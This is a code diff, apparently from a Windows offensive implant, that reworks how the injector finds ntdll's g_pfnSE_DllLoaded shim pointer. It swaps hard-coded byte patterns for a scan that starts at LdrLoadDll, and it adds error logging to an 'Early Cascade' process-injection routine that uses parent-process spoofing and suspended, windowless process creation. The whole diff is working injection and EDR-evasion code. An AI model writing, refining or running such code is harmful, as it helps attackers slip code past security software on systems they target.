@@ -3781,14 +3781,15 @@ static DWORD GetNtdllSectionSize(ULONG_PTR baseAddress, const char* name) {
 
 // ============================================================================
 // FindSE_DllLoadedAddress
-// Scans ntdll .text for patterns referencing g_pfnSE_DllLoaded across all
-// Windows versions (multi-pattern + RIP-relative scan + .mrdata walk tiers).
+// Export-table-guided approach: locate LdrLoadDll via GetProcAddress, follow
+// its first CALL (E8) to reach LdrpLoadDll, then scan only that function for
+// a RIP-relative MOV that resolves into .mrdata — that's g_pfnSE_DllLoaded.
 // ============================================================================
 
 LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
-    ULONG_PTR base = (ULONG_PTR)hNtDLL;
-    ULONG_PTR textBase = GetNtdllSectionBase(base, ".text");
-    DWORD     textSize = GetNtdllSectionSize(base, ".text");
+    ULONG_PTR base       = (ULONG_PTR)hNtDLL;
+    ULONG_PTR textBase   = GetNtdllSectionBase(base, ".text");
+    DWORD     textSize   = GetNtdllSectionSize(base, ".text");
     ULONG_PTR mrdataBase = GetNtdllSectionBase(base, ".mrdata");
     DWORD     mrdataSize = GetNtdllSectionSize(base, ".mrdata");
 
@@ -3796,82 +3797,77 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
         return NULL;
 
     // -----------------------------------------------------------------------
-    // Tier 1: Multiple byte patterns for g_pfnSE_DllLoaded across Windows builds
-    // Each entry is the bytes before the 4-byte RIP-relative offset.
+    // Step 1: Find LdrLoadDll via export table
     // -----------------------------------------------------------------------
-    // Win10 21H2 / 22H2: mov edx,[gs:330h]; mov eax,edx; mov rdi,[rel ...]
-    static BYTE pat1[] = { 0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F,
-                           0x8B, 0xC2, 0x48, 0x8B, 0x3D };
-    // Win10 1909 / 2004: mov rax,[rel ...]
-    static BYTE pat2[] = { 0x48, 0x8B, 0x05 };
-    // Win11 22H2 / 23H2 / 24H2: mov rdi,[rel ...]
-    static BYTE pat3[] = { 0x48, 0x8B, 0x3D };
-    // Win11 build 26100+: mov r13,[rel ...]
-    static BYTE pat4[] = { 0x4C, 0x8B, 0x2D };
+    LPBYTE pLdrLoadDll = (LPBYTE)GetProcAddress((HMODULE)hNtDLL, "LdrLoadDll");
+    if (!pLdrLoadDll)
+        return NULL;
 
-    struct { LPBYTE pat; DWORD len; } patterns[] = {
-        { pat1, sizeof(pat1) },
-        { pat2, sizeof(pat2) },
-        { pat3, sizeof(pat3) },
-        { pat4, sizeof(pat4) },
-    };
-
-    for (int p = 0; p < 4; p++) {
-        LPBYTE pFound = (LPBYTE)FindPattern((LPBYTE)textBase, textSize,
-                                            patterns[p].pat, patterns[p].len);
-        if (!pFound)
-            continue;
-        LPBYTE pOffsetPtr = pFound + patterns[p].len;
-        INT32  relOffset  = *(INT32*)pOffsetPtr;
-        LPVOID pResolved  = (LPVOID)(pOffsetPtr + 4 + relOffset);
-        if ((ULONG_PTR)pResolved < mrdataBase ||
-            (ULONG_PTR)pResolved >= mrdataBase + mrdataSize)
-            continue;
-        if (ppOffsetAddress)
-            *ppOffsetAddress = pOffsetPtr;
-        return pResolved;
+    // -----------------------------------------------------------------------
+    // Step 2: Find LdrpLoadDll by following the first CALL (E8) in LdrLoadDll
+    // LdrLoadDll is a thin wrapper that immediately calls LdrpLoadDll
+    // -----------------------------------------------------------------------
+    LPBYTE pLdrpLoadDll = NULL;
+    for (DWORD i = 0; i < 64; i++) {
+        if (pLdrLoadDll[i] == 0xE8) {  // CALL rel32
+            INT32  rel     = *(INT32*)(pLdrLoadDll + i + 1);
+            LPBYTE pTarget = pLdrLoadDll + i + 5 + rel;
+            // Validate: must be within .text
+            if ((ULONG_PTR)pTarget >= textBase && (ULONG_PTR)pTarget < textBase + textSize) {
+                pLdrpLoadDll = pTarget;
+                break;
+            }
+        }
     }
 
+    // Fallback: if no CALL found within .text, scan LdrLoadDll itself —
+    // on some builds LdrLoadDll may directly contain the .mrdata reference
+    if (!pLdrpLoadDll)
+        pLdrpLoadDll = pLdrLoadDll;
+
     // -----------------------------------------------------------------------
-    // Tier 2: RIP-relative scan — find any 48/4C 8B xx instruction in .text
-    // whose resolved address falls within .mrdata; pick the first 8-byte-
-    // aligned slot that is NULL or points into .text (function-pointer slot).
+    // Step 3: Scan LdrpLoadDll (up to 4096 bytes) for any RIP-relative MOV
+    // instruction that reads from .mrdata — that's g_pfnSE_DllLoaded
+    // Instruction encodings that load a qword pointer:
+    //   48 8B xx <rel32>  — MOV reg64, [RIP+rel32]
+    //   4C 8B xx <rel32>  — MOV r8-r15, [RIP+rel32]
     // -----------------------------------------------------------------------
-    for (DWORD i = 0; i + 7 < textSize; i++) {
-        LPBYTE pb = (LPBYTE)(textBase + i);
-        // Match: 48 8B ?? or 4C 8B ?? (3-byte prefix + 4-byte offset)
-        if ((pb[0] == 0x48 || pb[0] == 0x4C) && pb[1] == 0x8B) {
-            LPBYTE pOffsetPtr = pb + 3;
-            INT32  relOffset = *(INT32*)pOffsetPtr;
-            LPVOID pResolved = (LPVOID)(pOffsetPtr + 4 + relOffset);
-            if ((ULONG_PTR)pResolved < mrdataBase ||
-                (ULONG_PTR)pResolved >= mrdataBase + mrdataSize)
-                continue;
-            if (((ULONG_PTR)pResolved & 7) != 0)
-                continue;
-            ULONG_PTR slotVal = *(ULONG_PTR*)pResolved;
-            if (slotVal == 0 ||
-                (slotVal >= textBase && slotVal < textBase + textSize)) {
-                if (ppOffsetAddress)
-                    *ppOffsetAddress = pOffsetPtr;
-                return pResolved;
+    DWORD scanLen = 4096;
+    // Don't scan past end of .text
+    if ((ULONG_PTR)pLdrpLoadDll + scanLen > textBase + textSize)
+        scanLen = (DWORD)(textBase + textSize - (ULONG_PTR)pLdrpLoadDll);
+
+    for (DWORD i = 0; i + 6 < scanLen; i++) {
+        LPBYTE p = pLdrpLoadDll + i;
+        // Check for 48 8B xx or 4C 8B xx (REX.W MOV r64, rm64)
+        if ((p[0] == 0x48 || p[0] == 0x4C) && p[1] == 0x8B) {
+            // ModRM: mod=00, rm=101 means RIP-relative disp32
+            BYTE mod = (p[2] >> 6) & 0x3;
+            BYTE rm  = p[2] & 0x7;
+            if (mod == 0 && rm == 5) {
+                INT32  relOffset = *(INT32*)(p + 3);
+                LPVOID pResolved = (LPVOID)(p + 3 + 4 + relOffset);
+                // Validate: must be within .mrdata
+                if ((ULONG_PTR)pResolved >= mrdataBase &&
+                    (ULONG_PTR)pResolved <  mrdataBase + mrdataSize) {
+                    if (ppOffsetAddress)
+                        *ppOffsetAddress = p + 3;
+                    return pResolved;
+                }
             }
         }
     }
 
     // -----------------------------------------------------------------------
-    // Tier 3: Direct .mrdata walk — first 8-byte-aligned slot near the start
-    // of .mrdata that is NULL or points into .text.
-    // No corresponding .text instruction pointer; caller cannot use ShimsEnabled.
+    // Tier 3 fallback: Walk entire .mrdata looking for first 8-byte-aligned
+    // slot that is NULL or points to a valid address in .text
     // -----------------------------------------------------------------------
-    DWORD scanLimit = (mrdataSize < 0x200) ? mrdataSize : 0x200;
-    for (DWORD off = 0; off + sizeof(ULONG_PTR) <= scanLimit; off += sizeof(ULONG_PTR)) {
-        ULONG_PTR slotVal = *(ULONG_PTR*)(mrdataBase + off);
-        if (slotVal == 0 ||
-            (slotVal >= textBase && slotVal < textBase + textSize)) {
+    for (ULONG_PTR addr = mrdataBase; addr + 8 <= mrdataBase + mrdataSize; addr += 8) {
+        ULONG_PTR val = *(ULONG_PTR*)addr;
+        if (val == 0 || (val >= textBase && val < textBase + textSize)) {
             if (ppOffsetAddress)
                 *ppOffsetAddress = NULL;
-            return (LPVOID)(mrdataBase + off);
+            return (LPVOID)addr;
         }
     }
 
@@ -4157,6 +4153,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
 #if ENABLE_PPID_SPOOF
         if (hSpoofParent) CloseHandle(hSpoofParent);
 #endif
+        LOG_ERROR("EarlyCascade: CreateProcessW failed (0x%08lX)", GetLastError());
 #if DEBUG_BUILD
         printf("[!] EarlyCascade: CreateProcessW failed: %lu\n", GetLastError());
 #endif
@@ -4172,6 +4169,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     if (!CreateProcessW(wszTarget, NULL, NULL, NULL, FALSE,
                         CREATE_SUSPENDED | CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi)) {
+        LOG_ERROR("EarlyCascade: CreateProcessW failed (0x%08lX)", GetLastError());
 #if DEBUG_BUILD
         printf("[!] EarlyCascade: CreateProcessW failed: %lu\n", GetLastError());
 #endif
